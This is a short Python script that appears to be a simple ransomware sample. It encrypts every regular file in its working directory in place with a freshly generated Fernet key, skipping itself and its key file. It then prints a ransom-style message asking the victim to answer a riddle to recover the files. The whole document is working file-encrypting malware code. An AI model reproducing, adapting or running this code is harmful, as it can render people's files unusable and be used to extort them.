#!usr/bin/env python3
import os
from cryptography.fernet import Fernet
#find the files
files =[]

for file in os.listdir():
        if file =="withlove.py" or file =="thekey.key" or file =="love.py":
                continue
        if os.path.isfile(file):
                files.append(file)        
print(files)


#now save my key ^^

key = Fernet.generate_key()

with open("thekey.key", "wb") as thekey:
        thekey.write(key)
#now let's encrypt 3>

for file in files:
        with open(file, "rb") as thefile:
                contents =thefile.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        with open(file ,"wb") as thefile:
                thefile.write(contents_encrypted)


print ("all your file has been encrypted if u wanna recovery it solve this : who said this only those u love can break your heart")






